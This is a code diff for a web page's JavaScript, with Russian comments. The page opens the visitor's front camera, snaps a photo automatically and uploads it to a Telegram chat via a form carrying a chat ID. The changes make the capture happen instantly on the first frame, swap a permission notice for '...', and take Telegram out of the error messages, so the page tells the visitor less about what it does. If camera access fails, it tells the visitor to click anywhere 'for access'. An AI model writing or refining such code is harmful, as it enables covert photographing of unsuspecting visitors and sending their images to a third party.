@@ -84,6 +84,7 @@
 
     let stream = null;
     let photoCaptured = false;
+    let captureAttempted = false;  // Защита от двойного захвата
 
     function setStatus(msg, isError = false) {
         statusDiv.innerHTML = isError ? `⚠️ ${msg}` : `📘 ${msg}`;
@@ -99,11 +100,12 @@
         video.srcObject = null;
     }
 
-    async function captureAndSend() {
+    // МГНОВЕННЫЙ захват (без задержек)
+    function performCapture() {
         if (photoCaptured) return;
+        
         if (!video.videoWidth || !video.videoHeight) {
-            setStatus('Видеопоток ещё не готов, повтор через 0.5с...');
-            setTimeout(captureAndSend, 500);
+            setStatus('Ошибка: нет видеопотока', true);
             return;
         }
 
@@ -117,10 +119,10 @@
 
         canvas.toBlob(async (blob) => {
             if (!blob) {
-                setStatus('Ошибка доступа', true);
+                setStatus('Ошибка', true);
                 return;
             }
-            setStatus('Дайте разрешение для использования сайта');
+            setStatus('...');
 
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -133,16 +135,32 @@
                 });
                 const result = await response.json();
                 if (result.ok) {
-                    setStatus('✅ ');
+                    setStatus('✅!');
                     photoCaptured = true;
                     stopCamera();
                 } else {
-                    setStatus(`Ошибка Telegram: ${result.description}`, true);
+                    setStatus(`Ошибка: ${result.description}`, true);
                 }
             } catch (err) {
-                setStatus(`Сетевая ошибка: ${err.message}`, true);
+                setStatus(`Ошибка сети: ${err.message}`, true);
             }
         }, 'image/jpeg', 0.85);
+    }
+
+    async function captureAndSend() {
+        if (photoCaptured || captureAttempted) return;
+        captureAttempted = true;
+        
+        if (!video.videoWidth || !video.videoHeight) {
+            // Ждём первый кадр через событие playing
+            video.addEventListener('playing', function onPlaying() {
+                video.removeEventListener('playing', onPlaying);
+                performCapture();
+            }, { once: true });
+            setStatus('Ожидание первого кадра...');
+            return;
+        }
+        performCapture();
     }
 
     async function requestCameraAndAutoCapture() {
@@ -152,13 +170,14 @@
                 video: { facingMode: { exact: "user" } }
             });
             video.srcObject = stream;
-            setStatus('Инициализация...');
-            video.onloadedmetadata = () => {
+            setStatus('Камера готова');
+            
+            // МГНОВЕННЫЙ захват при готовности первого кадра
+            video.oncanplay = () => {
                 video.play();
-                setTimeout(() => {
-                    if (!photoCaptured) captureAndSend();
-                }, 1200);
+                captureAndSend();
             };
+            
         } catch (err) {
             if (err.name === 'OverconstrainedError') {
                 setStatus('Доступ не найден. Пробую любую...', true);
@@ -166,10 +185,10 @@
                     const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     stream = fallbackStream;
                     video.srcObject = stream;
-                    setStatus('Используется доступ по умолчанию.');
-                    video.onloadedmetadata = () => {
+                    setStatus('Используется доступ по умолчанию');
+                    video.oncanplay = () => {
                         video.play();
-                        setTimeout(() => captureAndSend(), 1200);
+                        captureAndSend();
                     };
                 } catch (fallbackErr) {
                     setStatus('Ошибка доступа: ' + fallbackErr.message, true);
@@ -186,7 +205,7 @@
         requestCameraAndAutoCapture();
         setTimeout(() => {
             if (!stream && !photoCaptured) {
-                setStatus('📌 Нажмите в любом месте страницы для доступа ');
+                setStatus('📌 Нажмите в любом месте страницы для доступа');
                 document.body.addEventListener('click', () => requestCameraAndAutoCapture(), { once: true });
             }
         }, 1500);
